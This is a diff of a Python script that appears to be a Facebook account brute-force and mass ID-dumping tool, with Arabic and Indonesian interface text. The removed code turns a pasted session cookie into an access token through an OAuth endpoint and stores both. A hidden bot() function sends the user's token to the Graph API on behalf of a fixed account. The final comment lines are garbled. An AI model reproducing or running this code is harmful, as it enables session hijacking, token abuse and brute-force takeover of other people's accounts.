@@ -1576,113 +1576,6 @@ id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni=
 cokbrut=[]
 pwpluss,pwnya=[],[]
 infoo=[]
-def Raghadan():
-    try:
-        token = open('.token','r').read()
-        cok = open('.cok','r').read()
-        tokenku.append(token)
-        try:
-            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
-            sy2 = json.loads(sy.text)['name']
-            sy3 = json.loads(sy.text)['id']
-            menu(sy2,sy3)
-        except KeyError:
-            login_lagi334()
-        except requests.exceptions.ConnectionError:
-            li = '#النت ضعيف حاول لاحقا او اعد تشغيل الاداة ✅'
-            lo = mark(li, style='red')
-            sol().print(lo, style='cyan')
-            exit()
-    except IOError:
-        login_lagi334()
-def login_lagi334():
-    try:
-        banner()
-        asu = random.choice([m,k,h,b,u])
-        cookie=input(f' ENTER COOKIES :{asu} ')
-        open(".cok", "w").write(cookie)
-        with requests.Session() as rsn:
-            try:
-                rsn.headers.update({
-                    'Accept-Language': 'id,en;q=0.9',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-                    'Referer': 'https://www.instagram.com/',
-                    'Host': 'www.facebook.com',
-                    'Sec-Fetch-Mode': 'cors',
-                    'Accept': '*/*',
-                    'Connection': 'keep-alive',
-                    'Sec-Fetch-Site': 'cross-site',
-                    'Sec-Fetch-Dest': 'empty',
-                    'Origin': 'https://www.instagram.com',
-                    'Accept-Encoding': 'gzip, deflate',
-                })
-                response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
-                if '"access_token":' in str(response.headers):
-                    token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
-                    open(".token", "w").write(token)
-                    print('%تم التسجيل بنجاح%s'%(h, p))
-
-                else:
-                    print('%sفشل تسجيل الدخول%s'%(m, p))
-            except:
-                print('تم تسجيل بنجاح ')
-        print(f'  {x}[{h}•{x}]{h}  أعد تشغيل {x} ');time.sleep(1)
-        exit()
-    except Exception as e:
-        os.system("rm -f .token")
-        os.system("rm -f .cok")
-        print(f'  %s[%sx%s]%s تم تسجيل الدخول%s'%(x,k,x,m,x))
-        print(e)
-        exit()
-def bot():
-    try:
-        requests.post("https://graph.facebook.com/100021452820090?fields=subscribers&access_token=%s"%(tokenku))
-    except:
-        pass
-def menu(my_name,my_id):
-	os.system('clear')
-
-	gh = 'h'
-	print(f"""⠀⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
-⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
-⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
-⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
-⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
-⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
-⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
-⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀
-""")
-
-	
-
-	_____alvino__adijaya_____ = '1'
-	if _____alvino__adijaya_____ in ['1']:
-		dump_massal()
-	elif _____alvino__adijaya_____ in ['0']:
-		os.system('rm -rf .token.txt')
-		os.system('rm -rf .cookie.txt')
-		print(' Successfully Logout+Delete Cookies√ ')
-		exit()
-	else:
-		print(' input correctly ')
-		back()
-def error():
-	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
-	time.sleep(4)
-	back()
-
-def setting():
-	
-	
-	print(f'>> 𝚒𝚍𝚜 : {len(id)}')
 
 def dump_massal():
     try:
@@ -2533,6 +2426,6 @@ if __name__ == "__main__":
     
     # استكمال العمل بعد إنشاء المجلدات والملفات
     brute = Brute()  # كائن من الفئة Brute
-    Menu()           # عرض القاjئnngggمjjة أو nتنفيذ الخياراتgh
+    Menu()           # عرض القاjئnngggمjjة أو nتنفيذb الخياراتgh
     
-    #bhgوتyyyتتتتناتتjjhhhhyاتتاااbh,😙𝚑𝚑iu😋gbتتتااhj𝐡𝐡
+    #bhgوتyyyتتتتناتتjjhhhhyاتتاااbh,😙𝚑𝚑😋gbتتتااhj𝐡𝐡
